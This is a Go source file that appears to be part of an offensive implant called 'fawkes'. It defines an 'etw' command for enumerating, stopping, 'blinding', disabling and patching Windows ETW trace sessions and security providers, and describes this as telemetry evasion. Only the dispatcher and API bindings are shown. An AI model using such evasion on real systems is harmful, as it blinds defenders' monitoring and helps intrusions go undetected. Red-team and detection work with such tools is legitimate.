//go:build windows
// +build windows

package commands

import (
	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type EtwCommand struct{}

func (c *EtwCommand) Name() string {
	return "etw"
}

func (c *EtwCommand) Description() string {
	return "Enumerate, stop, or blind ETW trace sessions and providers for telemetry evasion"
}

type etwParams struct {
	Action      string `json:"action"`
	SessionName string `json:"session_name"`
	Provider    string `json:"provider"`
}

var (
	advapi32ETW               = windows.NewLazySystemDLL("advapi32.dll")
	procQueryAllTracesW       = advapi32ETW.NewProc("QueryAllTracesW")
	procEnumerateTraceGuidsEx = advapi32ETW.NewProc("EnumerateTraceGuidsEx")
	procControlTraceW         = advapi32ETW.NewProc("ControlTraceW")
	procEnableTraceEx2        = advapi32ETW.NewProc("EnableTraceEx2")
)

// EVENT_TRACE_PROPERTIES structure (simplified)
// Minimum size needed for QueryAllTracesW
const eventTracePropsSize = 1024

// TRACE_QUERY_INFO_CLASS values
const (
	traceGuidQueryList = 0
	traceGuidQueryInfo = 1
)

// ControlTrace control codes
const (
	eventTraceControlQuery  = 0
	eventTraceControlStop   = 1
	eventTraceControlUpdate = 2
)

// EnableTraceEx2 control codes
const (
	eventControlCodeDisableProvider = 0
	eventControlCodeEnableProvider  = 1
)

// knownSecurityProviders and providerShorthands are defined in command_helpers.go

func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[etwParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "" {
		params.Action = "sessions"
	}

	switch params.Action {
	case "sessions":
		return etwSessions()
	case "providers":
		return etwProviders()
	case "provider-list":
		return etwProviderList()
	case "stop":
		return etwStop(params.SessionName)
	case "blind":
		return etwBlind(params.SessionName, params.Provider)
	case "query":
		return etwQuery(params.SessionName)
	case "enable":
		return etwEnable(params.SessionName, params.Provider)
	case "provider-disable":
		return etwProviderDisable(params.SessionName, params.Provider)
	case "provider-enable":
		return etwProviderEnable(params.SessionName, params.Provider)
	case "patch":
		return etwPatch(params.Provider)
	case "restore":
		return etwRestore(params.Provider)
	default:
		return errorf("Unknown action: %s (use sessions, providers, provider-list, stop, blind, query, enable, provider-disable, provider-enable, patch, restore)", params.Action)
	}
}
